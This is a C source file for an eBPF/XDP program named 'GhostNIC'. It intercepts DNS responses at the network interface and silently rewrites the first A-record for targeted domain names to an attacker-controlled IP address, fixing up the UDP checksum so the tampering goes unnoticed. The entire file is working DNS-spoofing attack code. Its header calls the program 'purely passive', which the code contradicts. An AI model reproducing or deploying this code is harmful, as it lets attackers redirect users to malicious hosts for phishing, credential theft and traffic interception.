/* SPDX-License-Identifier: GPL-2.0 */
/*
 * GhostNIC XDP ingress program.
 *
 * This program is purely passive: it never emits packets, never allocates
 * buffers, and never drops traffic unless explicitly configured to do so.
 * Its current capability is DNS response rewriting: UDP/53 answers are
 * inspected, the queried name is looked up in a BPF hash map, and the first
 * A-record in the answer section is rewritten to an attacker-controlled
 * IPv4 address without changing packet size.
 */
#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_endian.h>
#include "common.h"

/* XDP metadata helpers */
#define ctx_ptr(ctx, member) \
	((void *)(long)bpf_helper_choose(ctx, member))

struct {
	__uint(type, BPF_MAP_TYPE_HASH);
	__uint(max_entries, 1024);
	__type(key, struct dns_key);
	__type(value, __u32);
} dns_targets SEC(".maps");

/*
 * Copy the DNS question name into a flat, dot-separated string suitable for
 * hash-map lookup.  The wire format is a sequence of length-prefixed labels
 * ending in a zero octet.  Bounds are checked against ctx->data_end.
 */
static __always_inline int dns_name_to_key(void *dns, void *dns_end,
					   struct dns_key *key)
{
	__u32 off = sizeof(struct dns_hdr);
	__u32 name_len = 0;
	int i, j;

	for (i = 0; i < DNS_MAX_NAME; i++) {
		__u8 *len_ptr = dns + off;
		__u8 len;

		if ((void *)(len_ptr + 1) > dns_end)
			return -1;

		len = *len_ptr;
		if (len == 0) {
			off++;
			break;
		}
		if (len > 63)
			return -1;
		if (off + 1 + len > 512)
			return -1;
		if (name_len + len + 1 > DNS_MAX_NAME)
			return -1;

		for (j = 0; j < 63; j++) {
			__u8 *c;

			if (j >= len)
				break;
			c = dns + off + 1 + j;
			if ((void *)(c + 1) > dns_end)
				return -1;
			key->name[name_len++] = *c;
		}
		key->name[name_len++] = '.';
		off += 1 + len;
	}

	if (name_len > 0)
		key->name[name_len - 1] = '\0';
	else
		key->name[0] = '\0';

	return 0;
}

/*
 * Locate the first A-record in the DNS answer section and rewrite its rdata
 * to new_ip.  The UDP checksum is updated incrementally using bpf_csum_diff.
 */
static __always_inline int rewrite_first_a_record(void *dns, void *dns_end,
						  struct udphdr *udp,
						  __u32 new_ip)
{
	struct dns_hdr *hdr = dns;
	__u16 ancount = bpf_ntohs(hdr->ancount);
	__u16 qdcount = bpf_ntohs(hdr->qdcount);
	__u32 off;
	int a;

	if (qdcount != 1)
		return 0;

	/* Skip the single question section: name already parsed by caller, but
	 * here we need the byte offset that follows it.  We re-walk labels because
	 * we did not return the offset from dns_name_to_key.
	 */
	off = sizeof(struct dns_hdr);
	for (int i = 0; i < MAX_LABELS; i++) {
		__u8 *len_ptr = dns + off;
		__u8 len;

		if ((void *)(len_ptr + 1) > dns_end)
			return 0;
		len = *len_ptr;
		if (len == 0) {
			off++;
			break;
		}
		if ((len & 0xc0) == 0xc0) {
			off += 2;
			break;
		}
		if (len > 63)
			return 0;
		off += 1 + len;
		if (off > 512)
			return 0;
	}

	/* QTYPE + QCLASS */
	off += 4;

	for (a = 0; a < MAX_ANSWERS; a++) {
		struct dns_rr *rr;
		__u16 rtype;
		__u16 rdlen;
		__u8 *rdata;
		__u32 csum;

		if (a >= ancount)
			return 0;

		/* Answers almost always use name compression (pointer).  If a real
		 * label sequence is encountered we skip it conservatively.
		 */
		{
			__u8 *nb = dns + off;
			if ((void *)(nb + 1) > dns_end)
				return 0;
			if ((*nb & 0xc0) == 0xc0) {
				off += 2;
			} else {
				for (int l = 0; l < MAX_LABELS; l++) {
					__u8 llen;
					if ((void *)(nb + 1) > dns_end)
						return 0;
					llen = *nb;
					if (llen == 0) {
						off++;
						break;
					}
					if ((llen & 0xc0) == 0xc0) {
						off += 2;
						break;
					}
					if (llen > 63)
						return 0;
					off += 1 + llen;
					nb = dns + off;
				}
			}
		}

		rr = dns + off;
		if ((void *)(rr + 1) > dns_end)
			return 0;

		rtype = bpf_ntohs(rr->type);
		rdlen = bpf_ntohs(rr->rdlength);
		off += sizeof(*rr);

		if (rtype == 1 && rdlen == 4) { /* A record */
			__u32 old_ip_aligned = 0;
			__u32 new_ip_aligned = new_ip;
			int k;

			rdata = dns + off;
			if ((void *)(rdata + 4) > dns_end)
				return 0;

			for (k = 0; k < 4; k++)
				((__u8 *)&old_ip_aligned)[k] = rdata[k];
			for (k = 0; k < 4; k++)
				rdata[k] = ((__u8 *)&new_ip_aligned)[k];

			csum = bpf_csum_diff(&old_ip_aligned, sizeof(old_ip_aligned),
					     &new_ip_aligned, sizeof(new_ip_aligned),
					     ~udp->check);
			csum = (csum & 0xffff) + (csum >> 16);
			csum = (csum & 0xffff) + (csum >> 16);
			udp->check = (__u16)~csum;
			return 1;
		}

		off += rdlen;
		if (off > 1024)
			return 0;
	}

	return 0;
}

SEC("xdp/ghost_xdp")
int ghost_xdp(struct xdp_md *ctx)
{
	void *data_end = (void *)(long)ctx->data_end;
	void *data = (void *)(long)ctx->data;
	struct ethhdr *eth = data;
	struct iphdr *ip;
	struct udphdr *udp;
	struct dns_key key = {};
	__u32 ip_hlen;
	__u32 *new_ip;

	if ((void *)(eth + 1) > data_end)
		return XDP_PASS;
	if (eth->h_proto != bpf_htons(ETH_P_IP))
		return XDP_PASS;

	ip = (void *)(eth + 1);
	if ((void *)(ip + 1) > data_end)
		return XDP_PASS;

	if (ip->protocol != IPPROTO_UDP)
		return XDP_PASS;

	ip_hlen = ip->ihl * 4;
	if (ip_hlen < sizeof(*ip))
		return XDP_PASS;

	udp = (void *)((__u8 *)ip + ip_hlen);
	if ((void *)(udp + 1) > data_end)
		return XDP_PASS;

	/* Only rewrite DNS responses (source port 53). */
	if (udp->source != bpf_htons(53))
		return XDP_PASS;

	if (dns_name_to_key((void *)(udp + 1), data_end, &key) < 0)
		return XDP_PASS;

	new_ip = bpf_map_lookup_elem(&dns_targets, &key);
	if (!new_ip)
		return XDP_PASS;

	rewrite_first_a_record((void *)(udp + 1), data_end, udp, *new_ip);
	return XDP_PASS;
}

char _license[] SEC("license") = "GPL";
